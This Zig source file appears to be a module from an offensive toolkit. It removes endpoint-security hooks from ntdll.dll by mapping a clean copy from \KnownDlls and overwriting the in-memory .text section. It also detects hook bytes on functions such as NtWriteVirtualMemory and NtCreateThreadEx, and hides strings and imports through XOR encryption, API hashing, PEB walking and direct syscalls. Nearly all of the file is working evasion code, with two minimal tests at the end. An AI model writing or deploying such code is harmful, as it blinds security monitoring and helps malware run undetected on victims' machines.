const std = @import("std");
const types = @import("../types/types.zig");
const engine = @import("../syscalls/engine.zig");
const hash = @import("../types/hash.zig");
const peb_walk = @import("../types/peb_walk.zig");

const E = struct {
    pub const known_dlls = hash.xorEncrypt("\\KnownDlls\\ntdll.dll");
};

fn getNtdllTextSection(ntdll_base: types.PVOID) ?struct { base: usize, size: usize } {
    const bp: [*]u8 = @ptrCast(@alignCast(ntdll_base));
    const dos = @as(*const types.IMAGE_DOS_HEADER, @ptrCast(@alignCast(bp)));
    if (dos.e_magic != types.IMAGE_DOS_SIGNATURE) return null;
    const nt_off: usize = @intCast(dos.e_lfanew);
    const nt = @as(*const types.IMAGE_NT_HEADERS64, @ptrCast(@alignCast(bp + nt_off)));
    if (nt.Signature != types.IMAGE_NT_SIGNATURE) return null;

    const oh_off = nt_off + @offsetOf(types.IMAGE_NT_HEADERS64, "OptionalHeader");
    const sec_off = oh_off + nt.FileHeader.SizeOfOptionalHeader;
    const secs: [*]types.IMAGE_SECTION_HEADER = @ptrCast(@alignCast(bp + sec_off));

    for (0..nt.FileHeader.NumberOfSections) |i| {
        const s = secs[i];
        if (s.Name[0] == '.' and s.Name[1] == 't' and s.Name[2] == 'e' and s.Name[3] == 'x' and s.Name[4] == 't') {
            return .{
                .base = @intFromPtr(bp) + s.VirtualAddress,
                .size = s.Misc.VirtualSize,
            };
        }
    }
    return null;
}

fn openKnownDllsSection() ?types.HANDLE {
    var path_buf: [E.known_dlls.len]u8 = undefined;
    hash.xorDecrypt(&E.known_dlls, &path_buf);

    var us_buf: [512]u16 = undefined;
    @memset(&us_buf, 0);
    for (path_buf, 0..) |c, i| us_buf[i] = c;

    var us = types.UNICODE_STRING{
        .Length = @as(types.USHORT, @intCast(path_buf.len * 2)),
        .MaximumLength = @as(types.USHORT, @intCast(us_buf.len * 2)),
        .Buffer = @as(types.PWSTR, @ptrCast(&us_buf)),
    };

    var oa = types.OBJECT_ATTRIBUTES{
        .Length = @sizeOf(types.OBJECT_ATTRIBUTES),
        .RootDirectory = null,
        .ObjectName = &us,
        .Attributes = types.OBJ_CASE_INSENSITIVE,
        .SecurityDescriptor = null,
        .SecurityQualityOfService = null,
    };

    var section_handle: types.HANDLE = undefined;
    const status = engine.NtOpenSection(
        &section_handle,
        types.SECTION_ACCESS_MASK.SECTION_MAP_READ,
        @as(types.PVOID, @ptrCast(&oa)),
    );
    if (status < 0) return null;
    return section_handle;
}

pub fn isHooked(ntdll_base: types.PVOID) bool {
    const text = getNtdllTextSection(ntdll_base) orelse return false;
    const text_bytes: [*]const u8 = @ptrFromInt(text.base);

    const hooked_funcs = [_][]const u8{
        "NtAllocateVirtualMemory",
        "NtProtectVirtualMemory",
        "NtWriteVirtualMemory",
        "NtCreateThreadEx",
        "NtOpenProcess",
        "NtOpenKey",
        "NtQueryValueKey",
    };

    for (hooked_funcs) |func_name| {
        const func_ptr = @import("../types/export_resolve.zig").getFunctionByHash(
            ntdll_base,
            hash.encryptedHashFunc(func_name),
        ) orelse continue;
        const stub: [*]const u8 = @ptrCast(@alignCast(func_ptr));
        if (stub[0] == 0xE9) return true;
        if (stub[0] == 0xFF and stub[1] == 0x25) return true;
        if (stub[0] == 0xCC) return true;
        if (stub[0] == 0x48 and stub[1] == 0xB8) return true;
    }
    return false;
}

pub fn unhookNtdll() bool {
    const ntdll_hash = hash.encryptedHashModule("ntdll.dll");
    const ntdll_base = peb_walk.getModuleByHash(ntdll_hash) orelse return false;

    const text = getNtdllTextSection(ntdll_base) orelse return false;

    const section_handle = openKnownDllsSection() orelse return false;
    defer _ = engine.NtClose(section_handle);

    var clean_base: ?types.PVOID = null;
    var view_size: types.SIZE_T = 0;

    const map_status = engine.NtMapViewOfSection(
        section_handle,
        @as(types.HANDLE, @ptrFromInt(~@as(usize, 0))),
        @as(*types.PVOID, @ptrCast(&clean_base)),
        0,
        0,
        null,
        &view_size,
        2,
        0,
        0,
    );
    if (map_status < 0 or clean_base == null) return false;
    defer _ = engine.NtUnmapViewOfSection(
        @as(types.HANDLE, @ptrFromInt(~@as(usize, 0))),
        clean_base.?,
    );

    const clean_text = getNtdllTextSection(clean_base.?) orelse return false;
    if (clean_text.size < text.size) return false;

    var prot_base: ?types.PVOID = @ptrFromInt(text.base);
    var prot_size: types.SIZE_T = text.size;
    var old_prot: types.ULONG = 0;

    const prot_status = engine.NtProtectVirtualMemory(
        @as(types.HANDLE, @ptrFromInt(~@as(usize, 0))),
        @as(*types.PVOID, @ptrCast(&prot_base)),
        &prot_size,
        types.PAGE_EXECUTE_READWRITE,
        &old_prot,
    );
    if (prot_status < 0) return false;

    const src = @as([*]const u8, @ptrFromInt(clean_text.base));
    const dst = @as([*]u8, @ptrFromInt(text.base));
    @memcpy(dst[0..text.size], src[0..text.size]);

    prot_base = @ptrFromInt(text.base);
    prot_size = text.size;
    _ = engine.NtProtectVirtualMemory(
        @as(types.HANDLE, @ptrFromInt(~@as(usize, 0))),
        @as(*types.PVOID, @ptrCast(&prot_base)),
        &prot_size,
        old_prot,
        &old_prot,
    );

    var bytes_written: types.SIZE_T = 0;
    _ = engine.NtWriteVirtualMemory(
        @as(types.HANDLE, @ptrFromInt(~@as(usize, 0))),
        @as(types.PVOID, @ptrFromInt(text.base)),
        @as(types.PVOID, @ptrFromInt(clean_text.base)),
        text.size,
        &bytes_written,
    );

    return true;
}

pub fn unhookAndVerify() bool {
    const ntdll_hash = hash.encryptedHashModule("ntdll.dll");
    const ntdll_base = peb_walk.getModuleByHash(ntdll_hash) orelse return false;

    const was_hooked = isHooked(ntdll_base);
    if (!unhookNtdll()) return false;
    return !isHooked(ntdll_base);
}

test "isHooked returns false on clean system" {
    const ntdll_hash = hash.encryptedHashModule("ntdll.dll");
    const ntdll = peb_walk.getModuleByHash(ntdll_hash) orelse return error.SkipZigTest;
    const hooked = isHooked(ntdll);
    _ = hooked;
}

test "getNtdllTextSection returns valid region" {
    const ntdll_hash = hash.encryptedHashModule("ntdll.dll");
    const ntdll = peb_walk.getModuleByHash(ntdll_hash) orelse return error.SkipZigTest;
    const text = getNtdllTextSection(ntdll) orelse return error.SkipZigTest;
    try std.testing.expect(text.size > 0);
    try std.testing.expect(text.size < 0x100000);
    try std.testing.expect(text.base > @intFromPtr(ntdll));
}

const testing = std.testing;
